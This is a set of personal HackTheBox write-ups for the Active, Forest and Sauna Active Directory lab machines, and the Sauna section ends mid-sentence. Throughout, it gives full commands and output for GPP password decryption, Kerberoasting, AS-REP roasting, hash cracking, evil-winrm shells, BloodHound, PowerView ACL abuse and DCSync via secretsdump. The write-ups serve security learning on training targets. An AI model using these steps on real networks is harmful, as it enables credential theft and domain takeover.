{"/blog/":{"data":{"":"There’s nothing here yet :("},"title":"Blog"},"/book/":{"data":{"":"The following is a collection of writeups, personal notes and mini-essays. This is just a personal record, so don’t take it too seriously.\nPortSwigger Web Security Academy HackTheBox - Machines HackTheBox - Active Directory 101 Track hextree - Android Continent "},"title":"Book"},"/book/hackthebox-active-directory-101/":{"data":{"":"https://app.hackthebox.com/tracks/Active-Directory-101\n“A great collection of machines to help you really understand Active Directory…and how to break it!”\nForest "},"title":"HTB AD 101 Track"},"/book/hackthebox-active-directory-101/active/":{"data":{"":"","foothold#Foothold":"Starting with nmap:\n$ nmap -sCV -Pn -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.1.223 # Nmap 7.94SVN scan initiated Thu Aug 1 07:54:57 2024 as: nmap -sCV -Pn -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.1.223 Increasing send delay for 10.129.1.223 from 640 to 1000 due to 55 out of 183 dropped probes since last increase. Warning: 10.129.1.223 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.1.223 Host is up (0.16s latency). Scanned at 2024-08-01 07:55:10 -03 for 184s Not shown: 64319 closed tcp ports (conn-refused), 1193 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-01 10:57:04Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49169/tcp open msrpc Microsoft Windows RPC 49173/tcp open msrpc Microsoft Windows RPC 49174/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 44606/tcp): CLEAN (Couldn't connect) | Check 2 (port 44198/tcp): CLEAN (Couldn't connect) | Check 3 (port 32389/udp): CLEAN (Timeout) | Check 4 (port 9947/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2024-08-01T10:58:04 |_ start_date: 2024-08-01T09:45:44 |_clock-skew: 0s Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Aug 1 07:58:14 2024 -- 1 IP address (1 host up) scanned in 196.83 seconds From the scan, we find a lot of information about the machine, such as the version of the operating system, open ports, the domain name and also the fact that it’s running active directory and smb - which is noticeable by the 139 and 445 ports).\nQ1: How many SMB shares are shared by the target? smbclient can be used to attempt anonymous login on SMB.\n$ smbclient -L \\\\active.htb -I 10.129.1.223 -N R1: 7\nQ2: What is the name of the share that allows anonymous read access? Here, we can try accessing each one of the shares anonymously until one of the attempts doesn’t return an error\n$ smbclient '//10.129.1.223/\u003cSHARE-NAME\u003e' -U \"\" -N R2: Replication\nQ3: Which file has encrypted account credentials in it? After getting access to the Replication share, we can navigate it searching for files. What I did was simply searching for any files, downloading them and inspecting each one of them in my own machine. Luckily, there wasn’t many of them and I eventually found the right one.\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cGroups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"\u003e \u003cUser clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"\u003e \u003cProperties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/\u003e \u003c/User\u003e \u003c/Groups\u003e R3: Groups.xml\nQ4: What is the decrpyted password for the SVC_TGS account? The file we previously found is generated by an old version of Windows GPP that contained a vulnerable feature. It stored user data using these Groups.xml files, which besides being accessible by any user, would contain this hash that used a publicly documented key for encryption, allowing anyone to decrypt it and get other user’s credentials.\nOn my solve, as I still didn’t know about the vulnerability, I spent a decent amount of time trying to figure out how to crack the hash with hashcat, which couldn’t identify the hash format.\nEventually, I googled “groups.xml password format”, which returned a couple of results that talked about GPP, and that led me into the HackTricks page on Windows LPE.\nOn the linked section, I found the explanation for the vulnerability I just described and discovered this script to decrypt the password.\n$ gpp-decrypt \"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" I found it interest to take a look at the script’s source code in order to understand the algorithm and the disclosed encryption key thing.\nhttps://github.com/t0thkr1s/gpp-decrypt/blob/master/gpp-decrypt.py#L22\nR4: GPPstillStandingStrong2k18\nHere, I was kinda lost while trying to get a shell. As the output of nmap had a service similar to the WinRM one from the previous machines, running on port 47001, I kept trying to connect with evil-winrm for a long time, always getting the same error and wondering if I was doing something wrong. I then decided to take a peek at the write-up. At the point where I was, it said that we could use our acquired credentials to keep enumerating SMB, and suggested to run smbmap. This hint was enough to get back into doing some progress.\n$ smbmap -r -g smbmap.out -H 10.129.1.223 -u SVC_TGS -p GPPstillStandingStrong2k18 Although it didn’t show any information that I thought to be useful to do what I wanted, I realized that I could simply use the SVC-TGS user to try looking into the other shares, specifically the ones that I now know that I have access to.\nSo I went back to smbclient:\n$ smbclient '//10.129.1.223/Users' -U \"SVC_TGS\" --password=\"GPPstillStandingStrong2k18\" At this point I realized that the Users share was simply the Users directory from Windows. The SMB shell is just more limited.","machine-info#Machine info":" https://app.hackthebox.com/machines/148\n​Difficulty: Easy OS: Windows Release date: 28 Jul, 2018 Rooted on: 01 Jul, 2024 ","privilege-escalation#Privilege escalation":"Q5: Which service account on Active is vulnerable to Kerberoasting? This one, as it was close to the last task, I simply guessed it would be Administrator.\nR5: Administrator\nI then searched information about the Kerberoast attack and got to the HackTricks page.\nFound out that there is an impacket script to perform it, called GetUserSPNs.py.\n$ GetUserSPNs.py -request -dc-ip 10.129.1.223 active.htb/SVC_TGS -outputfile hashes.kerberoast Q6: What is the plaintext password for the administrator account? Cracking the hash with hashcat:\n$ hashcat -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt R6: Ticketmaster1968\nWe can now use smbclient again to access the User share as Administrator, and therefore be able to access their home directory.\nWith that, we finish the machine. It was supposed to be an introduction to Kerberoast. I feel like guided mode kinda helped me too much here, but that doesn’t stop me from doing further research on the aspects of the chain."},"title":"Active"},"/book/hackthebox-active-directory-101/forest/":{"data":{"":"","footholduser#Foothold/User":"Q1: For which domain is this machine a Domain Controller? Ran port scan with nmap:\n$ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210 Nmap scan report for 10.129.95.210 Host is up (0.17s latency). Scanned at 2024-07-25 17:11:19 -03 for 513s Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-25 20:26:15Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-07-25T20:26:25 |_ start_date: 2024-07-25T18:00:00 |_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2024-07-25T13:26:29-07:00 | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 36501/tcp): CLEAN (Couldn't connect) | Check 2 (port 37941/tcp): CLEAN (Couldn't connect) | Check 3 (port 32697/udp): CLEAN (Timeout) | Check 4 (port 13345/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 25 17:19:52 2024 -- 1 IP address (1 host up) scanned in 513.31 seconds R1: htb.local\nQ2: Which of the following services allows for anonymous authentication and can provide us with valuable information about the machine? FTP, LDAP, SMB, WinRM Attempting SMB\n$ smbclient -L 10.129.95.210 -U guest Password for [WORKGROUP\\guest]: session setup failed: NT_STATUS_ACCOUNT_DISABLED Attempting LDAP\n$ ldapsearch -H ldap://10.129.36.185:389/ -x -b 'dc=htb,dc=local' \"(objectClass=*)\" * # extended LDIF # # LDAPv3 # base \u003cdc=htb,dc=local\u003e with scope subtree # filter: (objectClass=*) # requesting: Desktop Documents Downloads Music Pictures Public Templates Videos htb # # htb.local dn: DC=htb,DC=local # Users, htb.local dn: CN=Users,DC=htb,DC=local # Allowed RODC Password Replication Group, Users, htb.local dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,DC=local # Denied RODC Password Replication Group, Users, htb.local dn: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local # Read-only Domain Controllers, Users, htb.local ... R2: LDAP\nQ3: Which user has Kerberos Pre-Authentication disabled? Took a while to craft this query:\n$ ldapsearch -H ldap://10.129.36.185:389/ -x -b 'ou=Employees,dc=htb,dc=local' \"(\u0026(objectClass=user)(objectClass=person))\" + # extended LDIF # # LDAPv3 # base \u003cou=Employees,dc=htb,dc=local\u003e with scope subtree # filter: (\u0026(objectClass=user)(objectClass=person)) # requesting: + # # Sebastien Caron, Exchange Administrators, Information Technology, Employees, htb.local dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU =Employees,DC=htb,DC=local # Santi Rodriguez, Developers, Information Technology, Employees, htb.local dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC =htb,DC=local # Lucinda Berger, IT Management, Information Technology, Employees, htb.local dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees, DC=htb,DC=local # Andy Hislip, Helpdesk, Information Technology, Employees, htb.local dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D C=local # Mark Brandt, Sysadmins, Information Technology, Employees, htb.local dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb, DC=local # search result search: 2 result: 0 Success # numResponses: 6 # numEntries: 5 After that, I also tried many other ldapsearch queries in order to find the right user, but only managed to do so by running enum4linux later, with all basic enumeration. Here is the one I thought would be the most promising:\n$ ldapsearch -H ldap://10.129.36.185:389/ -x -b 'dc=htb,dc=local' \"(objectClass=user)\"| grep \"sAMAccountName: \" | sed s/\"sAMAccountName: \"//g | cat -n 1 Guest 2 DefaultAccount 3 FOREST$ 4 EXCH01$ 5 $331000-VK4ADACQNUCA 6 SM_2c8eef0a09b545acb 7 SM_ca8c2ed5bdab4dc9b 8 SM_75a538d3025e4db9a 9 SM_681f53d4942840e18 10 SM_1b41c9286325456bb 11 SM_9b69f1b9d2cc45549 12 SM_7c96b981967141ebb 13 SM_c75ee099d0a64c91b 14 SM_1ffab36a2f5f479cb 15 HealthMailboxc3d7722 16 HealthMailboxfc9daad 17 HealthMailboxc0a90c9 18 HealthMailbox670628e 19 HealthMailbox968e74d 20 HealthMailbox6ded678 21 HealthMailbox83d6781 22 HealthMailboxfd87238 23 HealthMailboxb01ac64 24 HealthMailbox7108a4e 25 HealthMailbox0659cc1 26 sebastien 27 lucinda 28 andy 29 mark 30 santi However, when trying to run impacket-GetNPUsers with those usernames, it’s output stated that none of the accounts had the UF_DONT_REQUIRE_PREAUTH property set.\nThen I tried enum4linux:\n$ enum4linux -a 10.129.95.210 | tee enum4linux.out Why didn’t I find that user in any of my ldapsearch queries?\nIt happens that, in this case, since the server allows anonymous bind, it isn’t necessary to get a list of usernames before running the GetNPUsers script. It already requests for the users who have that property set and then asks for the TGTs.\nFollowing with my solve, I included that username in my list and tried running the impacket script again.\n$ impacket-GetNPUsers htb.local/ -dc-ip 10.129.36.185 -outputfile hash.txt -format hashcat -usersfile usernames-custom.txt Impacket v0.12.0.dev1 - Copyright 2023 Fortra [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User FOREST$ doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User EXCH01$ doesn't have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$svc-alfresco@HTB.LOCAL:b7292cee1a66a28f8b67fb064553a38d$663f567fbc37b84a525e6761682e354a1d4c13e10db57d41d194e13301528c48b687200a8e00d7f6e0c117d54c7034502075391ba970b0dce19868c6a0c9d2d9ddceb96c051955d3e168b198e9021f9f0b2132be9dcd46fb1b90edd2e7f40cb091ae8f0c7c833807621948aa3a7cfa9e6f2f078203f3bb2cbab21585d42655753259a0e5aa1245dab21b363e9e9fd3f1fad5919b09e4f9065a458a7b9df001af31681d01d15f220e02d4f2f69efb1cb41eb0ec63e4b749bdb1e30fa710ea2a159a603e69cd990fa1bc29eae7e08fd8cf91ac02f03793028b1bae9814571efa251e829371f327 By that output, we can notice that many of the usernames could’ve been excluded from my list.\nThis technique is known as AS-REP Roasting.\nR3: svc-alfresco\nQ4: What is the password of the user svc-alfresco? $ hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt R4: s3rvice\nQ5: To what port can we connect with these creds to get an interactive shell? As I wasn’t sure if any of the ports I’d found in the initial nmap scan could be hosting some kind of remote shell service, I decided to run another one through all of the TCP ports in the host.\n$ cat nmap/complete.nmap # Nmap 7.94SVN scan initiated Tue Jul 30 00:38:14 2024 as: nmap -sCV -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.36.185 Increasing send delay for 10.129.36.185 from 320 to 640 due to 89 out of 295 dropped probes since last increase. Warning: 10.129.36.185 giving up on port because retransmission cap hit (10). Nmap scan report for htb.local (10.129.36.185) Host is up (0.17s latency). Scanned at 2024-07-30 00:38:15 -03 for 157s Not shown: 65211 closed tcp ports (conn-refused), 300 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-30 03:46:34Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open msrpc Microsoft Windows RPC 49677/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49681/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 49925/tcp open msrpc Microsoft Windows RPC Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows ... None of these seemed like an obvious remote access service to me, so I’ve decided to take a look at the hint, which said that it would be interesting to check if WinRM was open.\nAfter googling “winrm”, I noticed that it used 5985 as it’s default port, which we found open in the nmap scan.\nR5: 5985\nI’ve found a couple of solutions to connect to the machine at this point. The most simple seemed to be using straight PowerShell, which comes pre-installed on Kali as pwsh, and then connecting to the remote machine using the Enter-PSSession command. That didn’t work, so used Evil-WinRM instead.\nPS C:\\Users\\svc-alfresco\\Documents\u003e ls C:\\Users Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/18/2019 10:09 AM Administrator d-r--- 11/20/2016 6:39 PM Public d----- 9/22/2019 3:29 PM sebastien d----- 9/22/2019 4:02 PM svc-alfresco ","machine-info#Machine info":" https://app.hackthebox.com/machines/Forest\nDifficulty: Easy OS: Windows Release date: 12 Oct, 2019 Rooted on: 31 Jul, 2024 IP changes on target are due to machine resets.","root#Root":"Q6: Which group has WriteDACL permissions over the HTB.LOCAL domain? Give the group name without the @htb.local. At this point, I decided to setup BloodHound, which consists in uploading the data collector script to the target, running it, download the resultant .zip file and importing it into the BloodHound client.\nWith bloodhound, we can have a graphic and logical view of the whole Active Directory, and also take advantage of many available queries that can give us insights on how to proceed with the privilege escalation.\nFrom bloodhound, we can find our current user under the menu, on Analysis \u003e Kerberos Interaction \u003e find AS-REP Roastable Users. We can mark it as owned.\nThen, we can execute the “Shortest Path to High Value Targets” query, giving us this messy result.\nBy zooming closer to the domain’s icon, we find the answer to the current question.\nHere is the Microsoft definition for DACL: “An access control list that is controlled by the owner of an object and that specifies the access particular users or groups can have to the object”\nThis means that if we are somehow able to get access to the “Exchange Windows Permissions” group we could grant ourselves any access control permissions over the domain.\nR6: Exchange Windows Permissions\nQ7: The user svc-alfresco is a member of a group that allows them to add themself to the “Exchange Windows Permissions” group. Which group is that? Still in the result of the same query, we see that the group “Account Administrators”, which we are in, has the permission “GenericAll” over the target group.\nThis GenericAll permission means that we can manipulate the object, which in this case is a group, in any way we want. By having this permission, we can add ourselves to the “Exchange Windows Permissions” group and explore it’s WriteDACL permission over the domain.\nR7: Account Operators\nI imported PowerView into the machine in order to continue.\nFirstly, I created a user using the net.exe utility.\nThen, I added my user to the “Remote Management Users” group, in order to be able to access it with evil-winrm.\nPS C:\\Users\\svc-alfresco\\Documents\u003e Add-DomainGroupMember -Identity \"Remote Management Users\" -Members zetsu Finally, added the account to the target group.\nPS C:\\Users\\svc-alfresco\\Documents\u003e Add-DomainGroupMember -Identity \"Exchange Windows Permissions\" -Members zetsu Now we can connect to our user in a new WinRM session.\nQ8: Which of the following attacks you can perform to elevate your privileges with a user that has WriteDACL on the domain? PassTheHash, PassTheTicket, DCSync, KrbRelay I had to take a look at the hint for this one. It indicated that bloodhound has a help section, which can be accessed by right-clicking the line which connects the Exchange Windows Permissions group and the domain object.\nR8: DCSync\nFrom the HackTricks page: “The DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.”\nWhat the WriteDACL permission allows us to do here is granting ourselves the permissions over the domain that are necessary to perform a DCSync attack. We can do so with PowerView.\nPS C:\\Users\\zetsu\\Documents\u003e $SecPassword = ConvertTo-SecureString 'chinforinfola' -AsPlainText -Force PS C:\\Users\\zetsu\\Documents\u003e $Cred = New-Object System.Management.Automation.PSCredential('HTB\\zetsu', $SecPassword) PS C:\\Users\\zetsu\\Documents\u003e Add-ObjectACL -PrincipalIdentity zetsu -Credential $Cred -Rights DCSync Now, we can use secretsdump.py to perform the actual attack.\n$ secretsdump.py -just-dc \u003cusername\u003e:\u003cpassword\u003e@\u003ctarget-ip\u003e -outputfile \u003cfilename\u003e Getting Administrator NT hash. Check this WikiPedia article for reference on the hash format.\nWe can use that hash to login, now as Administrator, using evil-winrm.\nThat was the box. Besides checking the Microsoft documentation for PowerShell commands now and then, I mostly used HackTricks as reference, so I really recommend the reading.\nhttps://book.hacktricks.xyz/windows-hardening/active-directory-methodology"},"title":"Forest"},"/book/hackthebox-active-directory-101/sauna/":{"data":{"":"","footholduser#Foothold/User":"Q1: What is the name of the HTML file that reveals the names of users working at the target company? Starting with nmap, scanning all TCP ports right away, just to avoid having to run it twice, as I did in Forest.\n$ nmap -sCV -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.95.180 # Nmap 7.94SVN scan initiated Wed Jul 31 21:46:55 2024 as: nmap -sCV -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.95.180 Nmap scan report for 10.129.95.180 Host is up (0.17s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Egotistical Bank :: Home |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-01 07:49:15Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49676/tcp open msrpc Microsoft Windows RPC 49697/tcp open msrpc Microsoft Windows RPC 49720/tcp open msrpc Microsoft Windows RPC Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: 7h00m00s | smb2-time: | date: 2024-08-01T07:50:07 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 31 21:50:49 2024 -- 1 IP address (1 host up) scanned in 233.60 seconds We see that there’s an IIS HTTP server on Port 80. Let’s take a look at it.\nClicking on “About Us” in the top navigation bar, we get redirected to /about.html. By scrolling down, we notice that it gives us names of some employees.\nR1: about.html\nQ2: Which user has Kerberos Pre-Authentication disabled? This question kinda indicates that we won’t be able to use anonymous bind on LDAP to get the usernames, but we can use the information from the about page in order to build a list and attempt running GetNPUsers with it.\nI used the following script to generate a list from those names:\nhttps://github.com/captain-noob/username-wordlist-generator\nHere’s the resulting list:\nFergus-Smith Fergus_Smith Fergus.Smith Fergus Smith FergusSmith FSmith FergusS F-Smith F_Smith F.Smith Fergus-S Fergus_S Fergus.S FS Shaun-Coins Shaun_Coins Shaun.Coins Shaun Coins ShaunCoins SCoins ShaunC S-Coins S_Coins S.Coins Shaun-C Shaun_C Shaun.C SC Hugo-Bear Hugo_Bear Hugo.Bear Hugo Bear HugoBear HBear HugoB H-Bear H_Bear H.Bear Hugo-B Hugo_B Hugo.B HB Bowie-Taylor Bowie_Taylor Bowie.Taylor Bowie Taylor BowieTaylor BTaylor BowieT B-Taylor B_Taylor B.Taylor Bowie-T Bowie_T Bowie.T BT Sophie-Driver Sophie_Driver Sophie.Driver Sophie Driver SophieDriver SDriver SophieD S-Driver S_Driver S.Driver Sophie-D Sophie_D Sophie.D SD Steven-Kerb Steven_Kerb Steven.Kerb Steven Kerb StevenKerb SKerb StevenK S-Kerb S_Kerb S.Kerb Steven-K Steven_K Steven.K SK Now, running the GetNPUsers script:\n$ impacket-GetNPUsers egotistical-bank.local/ -outputfile npusers.txt -format hashcat -usersfile userlist.txt -dc-ip \"10.129.95.180\" R2: FSmith\nQ3: What is the hash format returned from this AS-REP Roasting attack? Given the answer as the string between the first and third $ characters, including the $. R3: $krb5asrep$23$\nQ4: What is the password of the user fsmith? Now we can attempt cracking that hash. I did it with hashcat.\n$ hashcat -a 0 npusers.txt /usr/share/wordlists/rockyou.txt R4: Thestrokes23\nQ5: Now that you have a valid set of credentials, on what port can you connect to the machine and get an interactive shell? As we saw on the nmap output, port 5985 is open, which is the default port for WinRM, we learned in Forest that it is a protocol for remote access on windows.\nThis way, we can connect to the machine using evil-winrm, which besides giving the shell, also contains other stuff that are useful to pwn Windows.\n$ evil-winrm -i \"10.129.95.180\" -u \"fsmith\" -p \"Thestrokes23\" R5: 5985","machine-info#Machine info":" https://app.hackthebox.com/machines/229\n​Difficulty: Easy OS: Windows Release date: 15 Feb, 2020 Rooted on: 01 Jul, 2024 ","privilege-escalation#Privilege Escalation":"Q6: What user is configured to autologin? Trying to get user information:\nPS C:\\Users\\FSmith\\Documents\u003e get-localuser At this point, I spent a while searching for simple ways to get this user property, but none worked, so I read the lab’s hint, which suggested to run winPEAS. I used specifically the PowerShell version.\nAfter a couple of seconds watching the winPEAS output, I found this section:\nhttps://en.wikipedia.org/wiki/Winlogon\nA friend of mine also said afterwards that you could also search for Winlogon credentials with the reg command:\nPS C:\\Users\\FSmith\\Documents\\ComplexConfigurationStuff\u003e reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" R6: svc_loanmanager\nWhat confuses me about that question is the fact that svc_loanmanager is not the username that we use to get shell as the user. I only noticed that after spending a couple of minutes trying to figure out why I couldn’t get shell and realizing that the user appeared as SVC_LOANMGR in BloodHound, which we could actually use to connect.\nQ7: What is the password of the svc_loanmanager user? R7: Moneymakestheworldgoround!\nQ8: Since you have a valid set of credentials for the svc_loanmanager user you can use WinRM once again and switch to that user. What is the dangerous right that this user has over the domain? After logging in as this new user, we can use BloodHound to help 